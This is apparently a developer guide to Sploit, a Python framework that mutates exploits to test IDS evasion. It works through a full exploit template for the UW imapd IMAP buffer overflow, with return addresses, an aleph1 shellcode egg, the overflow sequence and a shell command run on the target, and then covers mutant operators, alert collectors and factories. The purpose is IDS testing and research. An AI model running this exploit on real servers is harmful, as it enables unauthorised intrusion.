Everything in Sploit, from the core engine to the graphical user
interface, is written in Python.<br>
This basically means two things:
<ol>
 <li> If you don't know how to program in Python, this guide won't
  make any sense for you.<br> You should better start with something
  like <a href="http://www.python.org/doc/current/tut/tut.html"> the
  python tutorial</a>.  
<li> If you already know Python (and you should, since it is a really
  wonderful language), Sploit will probably be easy to understand and
  modify (thanks to Python and despite the fact that Sploit is not
  particularly well-written)
</ol>

You probably don't need to read the whole guide. The idea is to read
the following brief description of the Sploit internal structure, and
then read until the section that contains the information you are
looking for. The section order is somehow important: for instance, if
you want to write a new mutant operator you probably also need to
understand how an attack template is written.

<br><br>

But let's go back to the main picture.
The Sploit framework can be split in seven different components:

<ul>
 <li><b>Attack Template</b> - An attack template is a python class
 containing the exploit code. The code is written using a set of
 special libraries that allow the engine to automatically modify the
 exploit, creating a number of <i>mutants</i>.
 
 </li> <li><b>Mutant Operators</b> - A mutant operator is a piece of
 python code that implements a transformation function. There are
 mutant operators operating at different levels of abstraction, such
 as the network level and the application level, and with different
 parameters.

 <li><b>Sploit libraries</b> - These are the libraries that can be
 used to write an attack template. In the current version there are
 libraries managing HTTP, FTP, IP, TCP, IMAP, and EGGs
 (shellcode). Each library provides special hooks for registering one
 or more mutant operators.</li>

 <li><b>Mutant Factory</b> - A mutant factory is the component that
 implements the policy used to drive the mutation process. It is the
 mutant factory that selects the list of mutant operators that have to
 be applied to generate a given mutant.</li>

 <li><b>Alert Collector</b> - It is the component in charge of
 retrieving the alert messages from the IDS sensors. </li>

 <li><b>The Sploit Engine</b> - It's the core of the whole
 system. It's in charge of gluing together all the other components
 and supervising the mutant execution.</li>

 <li><b>Command line and graphical interfaces</b> - The two interfaces
 a user can use to interact with Sploit</li>
</ul>

When the user runs the system, the engine enters a main loop
performing the following actions at each iteration: 

<ol> 

<li>The engine invokes the mutant factory, passing the result of the
    previous mutant and the alerts correlated with the previous attack
    as parameters. The mutant factory replies with the list of mutant
    operators that must be applied to the exploit template in order to
    generate the next mutant.</li>

<li>The engine connects the required mutant operators to the right
    hooks in the Sploit libraries.</li>

<li>The exploit template (modified by the mutant operators) is
    executed against the target system.</li>

<li>The engine interrogates the oracle to know the attack result.</li>

<li>The engine asks the alert collectors to retrieve and correlate the
    alert messages raised by the IDS sensors.</li>

</ol>

Now you are ready to jump to one of the following section:
<ul>
<li><a href="#exploit">How to write your own exploit template</a>
<li><a href="#operator">How to write a new mutant operator</a>
<li><a href="#collector">How to write an alert collector</a>
<li><a href="#factory">How to implement a new exploration algorithm</a>
</ul>

<br><br>
<a name="exploit"></a>
<div class="stitle">How to write your own exploit template</div>
<br>

To better explain how to write an exploit script we are going to
follow a real example.<br> 

Suppose you decide to write an attack to exploit the University Of
Washington imapd Buffer Overflow Vulnerabilities (references: <a
href="http://www.securityfocus.com/bid/1110">BID 1110</a> and <a
href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2000-0284">CAN-2000-0284</a>).
SecurityFocus describes the vulnerability as follow:

<br><br><center>
<table width="80%">
<tr><td>
A buffer overflow exists in imapd. The vulnerability exists in the
list command. By supplying a long, well-crafted string as the second
argument to the list command, it becomes possible to execute code on
the machine.
<br>
Executing the list command requires an account on the machine. In
addition, privileges have been dropped in imapd prior to the location
of the buffer overrun. As such, this vulnerability would only be
useful in a scenario where a user has an account, but no shell level
access. This would allow them to gain shell access.
</td></tr>
</table>
</center><br>

So, what we need to do is open a connection with the remote vulnerable
server, sending a valid userid and password and then put our shellcode
as second parameter of a <code>list</code> command. We can also
download a working exploit from the Security Focus <a
href="http://www.securityfocus.com/bid/1110/exploit">exploit page</a>.
<br>That seems a wonderful starting point....  <br><br>

We need to translate everything in Python and put our code in a class
that extends the base <code>Exploit</code> class. <br>
We can start with the following skeleton:

<pre>
class WUImapdBO(Exploit):

    def __init__(self)

    def set_up(self)

    def tear_down(self) 

    def execute(self)

    def isSuccessful(self)
</pre>

The Sploit engine calls the <code>set_up</code> method only once
before running the exploit and then calls <code>tear_down</code> after
the execution of the last mutant. These are the right places to put
some initialization code, to connect and disconnect to a remote
oracle, and so forth. The attack code has to be placed in the
<code> execute </code> method, while the <code> isSuccessful </code>
function should contains the oracle interrogation.
<br><br>

<h2>The Constructor</h2>

The constructor serves the purpose of calling the base Exploit
constructor (setting the name and the description of the attack) and
defining the attack parameters.<br>
The first operation is simple:
<pre>
  Exploit.__init__(self,'Wu-imapd buffer overflow', 'some description')
</pre>

The description can also contain HTML tags to look better when displayed in
the graphical interface.
<br><br>

The parameters definition is more complex. In Sploit there are many
classes that support parameters (e.g. Exploit, Mutant Operator, and
Alert Collector). Adding a parameter to an object provides a way to
add a new field to the object itself, with some more infrastructure
that allows the Sploit framework to identify that field as a parameter
that the user can modify (through the graphical interface or some
configuration file). 
<br><br> 

Each parameter is defined by a <code>Parameter</code> object and can
be added using the <code>add_parameter</code> function. Looking in the
<code>hasparameters.py</code> file, we can find some predefined
classes to manage string, integer, and keylist parameters. Each
parameter has a name, a description string, and a
<code>isMultiValues</code> flag that defines whether the user should
be able to set a list of values instead of a single one (we will use
extensively this feature with Mutant Operators).

<br><br> 

Since our exploit should be able to login on the remote server, the
user should be able to setup a valid userid and password. So, we need
to add two string parameters, one for the userid and one for the
password field (default values "foo" and "bar"):

<pre>
  self.add_param(StringParam('USER','foo', 'A valid userid'))
  self.add_param(StringParam('PASSWD','bar', 'The password for the
       previous userid'))
</pre>

Then, the exploit needs to know the target platform in order to choose
the correct return address for the shellcode. In this case, the
parameter should be able to accept only one of the following values
(taken by the original exploit downloaded from SecurityFocus):

<pre>
target_platform = [
  "Slackware 7.0 - IMAP4rev1 v12.261",
  "Slackware 7.1 - IMAP4rev1 v12.264",
  "RedHat    6.2(ZooT) - IMAP4rev1 v12.264",
  "Slackware 7.0 - IMAP4rev1 2000.284"
]
</pre>

The keylist parameter does exactly what we need:
<pre>
self.add_param(KeyListParam('PLATFORM',target_platform[2],
  target_platform, 'The target platform (used to choose the return address)'))
</pre>

Finally, we need a way to understand whether the attack was successful
or not. Since our exploit is going to open a shell on the remote
system, we can ask the user which command will be executed trough the
shell and what is the result that we must expect. An another couple of
parameters can resolve this problem:

<pre>
self.add_param(StringParam('CMD','cat /flag.txt', 'The command to be
  executed on the remote host'))

self.add_param(StringParam('RESULT','well done','The string that must
  be present in the result if the attack is successful'))
</pre>

In this case, the default behavior consists in printing the content of
the <code>/flag.txt</code> file on the target machine, and return that
the attack was successful if we receive back the "<code>well
done</code>" string.

<h2>Attack setup</h2>

Since the <code>set_up</code> method is executed only once at the
beginning of the testing process, it is the right place to configure
the shellcode.

<pre>
 1  def set_up(self):
 2     if self.PLATFORM == target_platform[0]:   
 3        self.retaddr = "\xec\xf3\xff\xbf" 
 4     elif self.PLATFORM == target_platform[1]: 
 5        self.retaddr = "\xe0\xf4\xff\xbf"
 6     elif self.PLATFORM == target_platform[2]:
 7        self.retaddr = "\x97\xf6\xff\xbf"
 8     elif self.PLATFORM == target_platform[3]: 
 9        self.retaddr = "\xc8\xeb\xff\xbf"

10     self.eggm = egg.EggManager(egg.aleph1, 1064)
11     self.eggm.append_ret(self.retaddr,25)
</pre>

The lines from 2 to 9 check the value of the <code>PLATFORM</code>
parameter and set the corresponding return address.<br> Line 10
instantiates a new <code>EggManager</code> telling it that we are
going to use the standard aleph1 shellcode and that the whole egg size
is going to be 1064 bytes.  The last line add the return address (25
times) at the end of the shellcode (the <code>EggManager</code> will
take care of reducing the nop slash to preserve the total size of 1064
bytes). The use of the <code>EggManager</code> class, instead of just
using a byte array for the shellcode, allows Sploit to automatically
introduce mutation at the egg layer. 

<h2>The attack code</h2>

The <code>exploit.py</code> defines two exception that can be raised
during the attack: a <code>ServiceDown</code> exception to be used any
time the attack thinks the target service is not working properly and
a generic <code>ExploitError</code> exception to report any other
problem occurring during the exploit execution. When an attack raises
a <code>ServiceDown</code> exception the engine waits a couple of
seconds and then tries again to execute the same mutant. After three
failed attempts it stops the process and asks the user to restart the
service. Instead, in case of an <code>ExploitError</code> exception,
the engine proceeds executing the next mutant.

<br><br>

Sploit provides a set of libraries, each one managing a different
protocol. In the current version, you can find a manager that provides
partial support for the following protocols: <code>HTTP</code>,
<code>FTP</code>, <code>IMAP</code>, <code>TCP</code>, and
<code>IP</code>. Even though the user can directly access the network
layer managers (TCP, IP, Eth), these are usually automatically managed
by the Sploit engine. In fact, whenever a user (or another protocol
manager) create a socket, the Sploit libraries take care of
instantiating either a traditional Python socket or a userland socket
depending on the attack setup.<br> 
In our case we just need an <code>IMAP</code> manager.

<br><br>

Finally, each exploit automatically provides a log channel, accessible
through the <code>self.log</code> field. The attack code should use it
to log different kind of messages, using the functions
<code>self.log.debug("msg")</code>, <code>self.log.info("msg")</code>,
<code>self.log.warning("msg")</code>, and
<code>self.log.error("msg")</code>. All these messages are usually
redirected to a special buffer during the exploit execution. The user
can decide what to do with the buffer and what level of verbosity he
wants to be accepted (please refer to the <a
href="./user-guide.html">user guide</a> for any details on how to
configure the logging subsystem).

<br><br>
 
Back to our attack, we identified four different steps:
<ol>
<li> Connect to the target system
<li> Send a valid userid and password
<li> Send the shellcode
<li> If we get the shell, execute the user command and save the result
</ol>

Let's start opening the connection:

<pre>
def execute(self):
    self.res       = ''
    imap = IMAP.IMAPManager()
                
    self.log.info("Connecting to the server...")

    if imap.connect()==False:
        raise exploit.ServiceDown
</pre>

At the beginning, we initialized the <code>self.res</code> field that
will contain the attack result. Then, we instantiate an
<code>ImapManager</code> and we call the <code>connect()</code>
method. As you can see, it is not necessary to specify the target
address, since the Sploit engine takes care of that.  If the
connection process fails, our code raises a <code>ServiceDown</code>
exception to tell the engine that something went wrong during the
connection phase.

<br><br>

The next step consists in sending the userid and password:

<pre>
    self.log.info("Sending login...")

    imap.send_cmd('login %s %s'%(self.USER, self.PASSWD)))
                
    resp = imap.get_imap_response()
                
    if not ("OK LOGIN" in resp):
        self.log.error("Login failed!!")
        raise exploit.ExploitError("Login failed")
</pre>

The <code>ImapManager</code> provides two method for sending data:
<code>send_cmd(imap_commmand)</code> and
<code>send_raw(string)</code>. Calling <code>send_raw</code> you can
force the manager to send the string as it is, without any
modification. The <code>send_cmd</code> function receives instead an
<code>IMAPCommand</code> object (or a string that will be parsed to
build a <code>IMAPCommand</code> object). Using this method, the
engine passes the command object through all the Mutant Operators that
have been registered to work at the IMAP layer.<br>

Our code uses the <code>send_cmd</code> to send the login command and
then calls the <code>get_imap_response</code> method to get the server
response. If the response does not contain the "<code>OK LOGIN</code>"
string, the exploit logs a message and raises an error.<br> Note that
the IMAP protocol require each command to start with a tag. If you
need to use a specific tag, you can create your
<code>IMAPCommand</code> object and set your tag. Since we do not care
about choosing our tags, we let the <code>ImapManager</code> do that for us.

<br><br>

Step 3: sending the shellcode:

<pre>        
    self.log.info("Logged-in.\nSending the shellcode...")
                
    imap.send_cmd('lsub "" {1064}')
    resp = imap.get_imap_response()
    self.log.info("Resp: %s"%resp)
                                
    self.log.info("Sending shellcode...")
    imap.send_raw(self.eggm.get_egg())
    imap.send_raw("\n")
    imap.send_raw("\n")
</pre>

As you can see, the raw shellcode data are sent using the <code>send_raw</code>
method because it's a payload and we don't want that the ImapManager
try to interpret it as an IMAP command.

<br><br>

Finally, we are going to execute the user command and check the result:

<pre>
    time.sleep(2)
                
    self.log.info("Sending shell command: %s"%self.CMD)
    imap.send_raw(self.CMD+"\n")
    self.res = imap.sock.readline('\n',blocking=True)
                
    self.log.debug("Response:\r\n%r"%self.res)
    imap.close()
</pre>

Here, we start sleeping two second waiting for the shell and then we
send the user command. We also need an hack to read the server
response. In fact, after the shell is open, we are not talking anymore
with the IMAP server. So, the <code>ImapManager</code> is not able
anymore to interpret the traffic in the correct way. For this reason,
we need to bypass it, reading the response directly from the
underlying socket. To simplify this process, in Sploit every protocol
manager provides a reference to the underlying network socket.<br>
The final result was stored in the <code>self.res</code> field.


<h2>A simple oracle</h2>

The <code>exploit.py</code> file defines the result code that can be
returned by the oracle:

<pre>
RES_OK      = 1  # The exploit run successfully
RES_ERROR   = 2  # An error occurred during the exploit execution
RES_FAIL    = 3  # The exploit finished but failed
RES_UNKNOWN = 4  # The exploit finished but the result is unknown
</pre>

Everytime the attack raises an <code>ExploitError</code> exception, the
engine sets the result to <code>RES_ERROR</code> without interrogate
the exploit oracle. The result <code>RES_UNKNOWN</code> should be
avoided and used only when the oracle it is not able to correctly
correlate the state of the service with the attack execution.

<br><br>

In our example, writing an oracle is as simple as checking the content
of the <code>self.res</code> field:

<pre>
def isSuccessful(self):
   if self.RESULT in self.res:
       return exploit.RES_OK
   else:
       return exploit.RES_FAIL
</pre>

<br><br>
<a name="operator"></a>
<div class="stitle">How to write a new mutant operator </div>
<br>

A mutant operator operates as filter that receives one or more objects
(the type and the number depends on the layer), apply some
transformation, and return one or more objects to the caller.
<br>

Each mutant operator extends the <code>MutantOperator</code> class,
and implements three different methods: <code>mutate</code> (that
contains the transformation code), <code>insert</code> (that connect
the operator to the right library hook), and <code>remove</code> (that
disable the operator).

<br><br>

Even though it is possible to inherit directly from the base
<code>MutantOperator</code> class, it is a better practice to extend
one of the existing sub-classes. For instance, if you want to add a new
operator that works with the IMAP protocol, you should extend the
<code>IMAPLayerOperator</code> class:

<pre>
class IMAPLayerOperator(MutantOperator):
    group             = 'IMAP Layer' 
    group_description = '''This mutations are applied to the IMAP
        commands before sending them to the server'''
    isa_operator      = False  # cannot be instantiated
        
    def mutate(self, requests):
        return requests
                
    def insert(self):
        IMAP.DEFAULT_IMAP_OPERATORS.append(self)
        
    def remove(self):
        IMAP.DEFAULT_IMAP_OPERATORS.remove(self)
</pre>

This class is just a skeleton that defines how the operator adds and
removes itself from the IMAP library. It sets the values of the
<code>group</code> and <code>group_description</code> fields. Finally,
the <code>isa_operator = False</code> tells the engine that this is
not an real operator and it should not appear in the mutant operator
list. 

<br><br>

Let's take the exploit we wrote in the previous section. Since it uses
the <code>ImapManager</code>, it already takes advantage of all the
existing general purpose IMAP Mutant Operators. <br>

Reading the vulnerability description, we can see that the same
vulnerability affects different commands (<code>COPY</code>,
<code>LSUB</code>, <code>RENAME</code>, <code>FIND</code>, and
<code>LIST</code>) while our exploit just uses one of them. So, now we
want to add an operator that substitutes one command with another,
preserving the same parameters.

<br><br>

This is the code:

<pre>
class ImapReplaceCommand(IMAPLayerOperator):
  isa_operator      = True

  def __init__(self):
    IMAPLayerOperator.__init__(self,'IMAPReplaceCommand',
      'Substitute a commmand with another')

    self.add_param(StringParam('From','LSUB','Command to be replaced', True))
    
    param = StringParam('To','FIND','Command alternatives', True)
    param.set_multiple_values(['FIND', 'LIST'])
    self.add_param(param)

  def mutate(self, cmds):
    result = []
    for c in cmds:
      if c.cmd == self.From:
        c.cmd = self.To
      result.append(c)
    return result
</pre>

The idea is simple. Inside the constructor we set the operator name,
a brief description, and we add two parameters: <code>From</code> that
contains the command to be substituted and <code>To</code> that
contains the list of alternatives (refer to the previous section for
more information about the parameters syntax).<br> Everytime the
exploit try to send an IMAP command, the <code>IMAPManager</code> pass
the command through the chain of the <code>mutate</code> methods
provided by each subscribed mutant operators.<br>
The actual type of the <code>cmds</code> parameters depends on the
protocol manager. It can be a list of IP packets, HTTP requests, or
FTP commands. In our case, <code>mutate</code> receives a list of
<code>ImapCommand</code>, allowing the operator to add, remove, or
modify any of them. The method must return a new list of <code>IMAPCommand</code>.  

<br><br>

The code is trivial. We just check if one of the commands is equal to
the one defined by the <code>From</code> field, and we substitute it
with the current value of the <code>To</code> field (its current value
is decided by the mutant factory).

<br><br>

<br><br>
<a name="collector"></a>
<div class="stitle">How to write an alert collector</div>
<br>

The alert collector is probably one of the most tricky part in the
Sploit framework. Its role consists in retrieving the alert messages
from the IDS sensor and correlate them to the right mutant. How this
can be done is extremely IDS specific, but usually the idea consists
in extracting the alert messages from some log files and compare the
alert and the attack information to understand which mutant caused the
message.

<br><br>

Any collector has an internal dictionary that contains the association
between mutant numbers and alert messages. The dictionary contains
also a special value, named "uncorrelated", that will contain any
message the collector is not able to properly correlate to a specific
mutant.<br>

The main Collector class already provides the implementation of two
methods: <code>reset()</code> and <code>get_alerts</code>. The first,
as the name says, resets the content of the internal dictionary; the
second is used to read the dictionary itself.
<br><br>
Collector, as many other classes in Sploit, extends the HasParameter
class inheriting the functions to dynamically add parameters to its
object (see the <a href="#exploit">exploit</a> section for more
details on how to add parameters to an object).   


<pre>
class Collector(HasParameters):

    def connect(target)
        
    def close() 

    def get_name()

    def correlate(self, exploits)
        
    def reset(self):
        self.results = {"uncorrelated":[]}

    def get_alerts(self, mutant_number=None):
        '''
        Return the alerts correlated to the mutant mutant_number
        If mutant_number is None (the default value)
        the function returns the whole alerts dictionary
        '''

        if mutant_number == None:
            return self.results
        elif self.results.has_key(mutant_number):
            return self.results[mutant_number]
        else:
           return None
</pre>

Beside the obvious <code>get_name()</code>, a collector must implement
three methods: <code>connect()</code>, <code>close()</code>, and
<code>correlate(exploits)</code>. In the common case where the
intrusion detection systems runs on a different computer than Sploit,
<code>connect()</code> and <code>close()</code> can be used to open
and close the channel to talk with the IDS system. 

<br><br>

The role of the <code>correlate(exploits)</code> function is to read
the alert messages from the sensor and put them in the right place
inside the dictionary. The method receives as parameter a list of
exploit execution info, each containing the following information:

<pre>
number     --> The mutant number
operators  --> The list of mutant operator used to generate the mutant
tcp_ports  --> A couple [min,max] of the TCP ports used during the attack
udp_ports  --> A couple [min,max] of the UDP ports used during the attack
result     --> The attack result
exectime   --> The execution time in second
date       --> The date/time when the mutant was executed
</pre> 

Usually, there are two approaches to correlate the alert messages.
The first consists in comparing the execution time with the time
reported in the alert messages. A more precise solution is based on
the ports numbers. In fact, each alert message, usually contains the
source IP:PORT from which the attack was launched. Comparing the port
number with the ones stored in the mutant execinfo, it should be easy
to identify which mutant was responsible of raising the alert.      


<br><br><br><br>
<a name="factory"></a>
<div class="stitle">How to write a new exploration algorithm</div>
<br>

In the previous sections we have seen how one or more mutant operators
can be registered to apply their transformation during the execution
of the attack template. But who decides which operators must be enable
for a given mutant?

<br><br>

The user decides the subset of mutant operators that he wants to use
in the testing experiment (see the <a href="./user-guide.html">user
guide</a>). He also selects a mutant factory, that is responsible of
combining such operators in multiple ways to effectively generate the
mutants.

<br><br>

The following code fragment shows the methods provided by a MutantFactory:

<pre>
class MutantFactory(HasParameters):

        def set_opmanager(self, opmanager)

        def get_name(self)
                
        def require_sync_collectors(self)

        def reset(self)

        def set_first(self, firstmutant)
      
        def next(self, result)

        def count(self)

	def current_mutant(self)
</pre>

The function <code>set_opmanager</code> is called by the Sploit engine
to set the Operator Manager. The <code>OpManager</code>, as the name
says, is the object that manages the set of mutant operators. It
provides methods to load the complete list of operators, add or remove
an operator to the selected list, and move up and down an operator in
the selected list. The mutant factory will use this object to enable,
disable, and configure operators.

<br><br>

Before starting the testing process, the engine calls the
<code>reset</code> method, followed by a <code>set_first</code> call
to set the index of the first mutant that the user want to
generate. Then, inside the main loop, the engine calls
<code>next</code> until the method return <code>None</code> (that the
way the mutant factory uses to say that it has already generated all
the mutant according with its policy) or until the range of mutants
chosen by the user have been executed. For instance, if the user runs
Sploit with the <code>-r 4:8</code> parameter, the engine calls:
<code>reset()</code>, <code>set_first(4)</code>, <code>next()</code>,
<code>next()</code>, <code>next()</code>, <code>next()</code>.

<br><br>

The <code>count()</code> method should return the total number of
mutant that the factory can generate. In case it is not possible to
precompute this value the method should return -1. Finally,
<code>require_synch_collectors()</code> tells the engine if the mutant
factory is going to use or not the information provided by the alert
collector to drive the exploration process. If the method returns
<code>True</code>, the engine must interrogates the alert collectors
synchronously after each mutant execution, otherwise it adopts the
more efficient solution that consists in collecting and correlating
all the alert messages at the end of the testing experiment.

For instance, we can analyze the code of the OneAtTimeFactory:
 
<pre>
class OneAtTheTimeFactory(MutantFactory):
 
    def __init__(self):
        MutantFactory.__init__(self, "One at the time")
        self.reset()

    def set_first(self, mutantnumber):
        if mutantnumber >= 0 and mutantnumber < self.number:
            self.current = mutantnumber
            return True
        return False

    def reset(self):
        self.current = 0
        self.number  = 0
        if self.opmanager == None:
            return
        self.selected = self.opmanager.get_selected_operators()
        if len(self.selected)==0:
            self.number = 0
        else:           
            for y in self.selected:
                self.number += y.params_combinations()


    def next(self, result):
        if self.opmanager == None:
            return None

        if (self.current >= self.number):
            return None
                
        n = self.current
        for y in self.selected:
            if y.params_combinations() > n:
                y.set_params_combination(n)
                self.current += 1
                return [y]
            n = n - y.params_combinations()

    def require_sync_collectors(self):
        return False

    def count(self):
        return self.number

    def current(self):
         return self.current

</pre>

The <code>reset()</code> function compute the total number of mutant
that can be generated (and saves it in the <code>self.number</code>
field) and gets the list of the mutant operators that have been
selected by the user (and saves it in the <code>self.selected</code>
field).<br>

The <code>next()</code> method contains the actual code that selects
and configures the operators for each mutant. The idea is simple: it
browse the selected operators asking them how many parameter
combinations they support (using the built-in
<code>params_combinations()</code> method). After the correct mutant
operator has been found, the parameters can be set using another
operator function: <code>set_params_combination(int)</code>.
<br>

Note that since the factory can compute the next mutant without any
information about the execution of the previous attacks, this factory
does not require a synchronous alert collection phase.
